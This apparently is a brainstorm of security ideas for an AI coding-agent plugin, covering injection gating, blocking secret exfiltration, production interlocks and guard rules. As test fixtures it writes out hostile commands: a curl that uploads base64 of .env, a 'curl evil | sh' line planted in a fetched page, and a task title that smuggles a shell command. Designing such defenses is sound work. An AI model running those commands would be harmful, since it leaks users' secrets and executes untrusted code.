# Brainstorm — lens: security and safety

- **Interlock any command that can reach a production target** — SECURITY — value 5 — effort M — risk med — category: blast radius
  Why: assumption: bypass-by-default plus verify commands that run the user's real test runner (1,586 calls) inherit the user's env. A `DATABASE_URL`, kube context, AWS profile or terraform workspace pointing at prod is a classic agent disaster, and the pack shows no check for it. Nearest existing: "Govern infrastructure changes", which is plan/apply, not ambient detection.
  Done when: with `DATABASE_URL=postgres://prod.example.com/x` exported, `fm check` and a Bash `pytest` both stop with a named reason and a one-line allow-once, and the same command passes with a localhost URL.

- **Match outbound payloads against the exact secret values seen this session** — SECURITY — value 5 — effort M — risk med — category: exfiltration
  Why: the pack's egress ideas are pattern-based ("scan outbound data", "redact"). Exact-value matching is different. When a tool output or `.env` read exposes a value, store only its hash, plus the base64 and hex forms. Then block any later Bash, commit, push, notification, Artifact or `fm page` payload containing it.
  Done when: after `cat .env`, a `curl -d "$(base64 .env)"` and a commit containing the key are both refused, and an unrelated string passes.

- **Gate unattended runs on human origin** — SECURITY — value 4 — effort S — risk low — category: injection
  Why: several queued paths turn machine-read text into tasks: TODO harvest, issue and PR import, brainstorm ideas, research notes. `fm run` and `fm night` then execute those tasks in bypass mode. Stamping provenance is listed, but gating execution on it is not.
  Done when: a task created from a TODO comment or imported issue stays "needs promote" and `fm run` skips it until one human yes. A user-typed capture runs as before.

- **Keep a shadow-repo safety net for what git can't restore** — SECURITY — value 4 — effort M — risk med — category: undo
  Why: bypass mode is the default and users run Foreman on repos with ignored files, local config and untracked scratch. Existing undo ideas cover tracked files and hunks. This adds a git dir kept outside the project that snapshots ignored and untracked files (size-capped, secrets redacted) at focus and before destructive commands.
  Done when: after the model runs `rm -rf` on an ignored `data/` directory, `fm rewind` restores it byte-for-byte and the snapshot is absent from the project's `git status`.

- **Trace a blocked command back to the content that planted it** — FEATURE — value 4 — effort M — risk low — category: forensics — wild
  Why: assumption: the guard knows what it blocked but not why the model wanted it. On a high-severity block, search the transcript for the earliest tool result containing the command's distinctive substrings. Report "this text first appeared in WebFetch result N" or "in README.md line 40". That turns an anonymous refusal into an injection report.
  Done when: in a fixture where a fetched page contains `curl evil | sh` and the model tries it, the block message names that fetch. With no match, it says "no external source found".

- **Make `<private>` spans invisible to Foreman's stores** — FEATURE — value 4 — effort S — risk low — category: privacy
  Why: claude-mem ships `<private>` tags, and Foreman stores captures verbatim, writes them to the ledger, and feeds them into brainstorm packs and `fm page`. A user pasting a token with an instruction has no way to say "don't keep this".
  Done when: a capture containing `<private>sk-123</private>` leaves "sk-123" absent from state, ledger, briefs, pack and page output, and the task still reads sensibly with a `[private]` marker.

- **Run a newcomer's first three tasks in probation lanes** — FEATURE — value 4 — effort M — risk low — category: trust ramp — wild
  Why: the pack shows install flips bypass on and asks a big trust leap. Instead the first three tasks run in a lane worktree and merge only after a one-yes diff review. After three clean merges Foreman offers to drop probation. This pairs with "earned bypass" but gives it a concrete mechanism.
  Done when: on a fresh install the first `fm task finish` leaves the user's tree untouched until `fm lane merge`, and the third merge prints the "skip probation?" offer.

- **Count allows made by silence, not by proof** — CLEAN — value 3 — effort M — risk low — category: guard coverage
  Why: assumption: the guard is largely deny-pattern based, so most allows mean "no rule matched". Log each allow as proven-safe (read-only, parsed) or unmatched. Report the unmatched rate and the top unmatched command shapes in `fm doctor`. That gives a measurable target for shrinking blind spots.
  Done when: `fm doctor` prints the 30-day split, and a new rule for the top unmatched shape moves a replayed command from unmatched to proven.

- **Let learned approvals only narrow** — SECURITY — value 3 — effort S — risk low — category: approvals
  Why: "learn standing approvals from repeated yes" is a past idea. The safeguard is missing: learned grants should be exact argv-shape, expire in days, and never form for egress, destructive or credential classes. Sudden widening after a prompt injection is the risk.
  Done when: three yeses to `rm -rf build/` create an exact-path grant that expires, while three yeses to a `curl` upload create nothing and say why.

- **Shell-quote every command Foreman prints or injects** — FIX — value 3 — effort S — risk low — category: injection
  Why: refusals, "Next:" hints and the proposed prefilled `fm task finish` call embed task titles and file names. A hostile title could end up as copy-paste, or as text the model runs. Route every emitted command through one builder.
  Done when: a task titled `x"; touch /tmp/pwn; "` yields a suggested command that, executed, creates no file. A test fails if any emitter bypasses the builder.

- **Keep Foreman's own credentials in the OS keyring** — SECURITY — value 3 — effort M — risk med — category: secrets
  Why: assumption: the serve token, device-pairing keys, and ntfy topics or webhook URLs (which are bearer secrets) currently sit in files. They are reachable by anything with Read, and the Desktop and `fm serve` surfaces are growing. Add one vault with `fm secret rotate/revoke`.
  Done when: no such secret appears in plain text under `~/.claude` or the state dir, and `fm secret revoke serve` makes the old token fail.

- **Ship a signed, tighten-only guard rule feed** — FEATURE — value 3 — effort L — risk high — category: threat intel — wild
  Why: Foreman already scouts Claude Code releases and rival plugins. Convert advisories into guard rules delivered like antivirus signatures. Each pack is replay-checked against the user's real command history and can add refusals but never allow anything.
  Done when: installing a pack adds a refusal that blocks a fixture command, and a pack that loosens any prior verdict is rejected with the offending replay case.
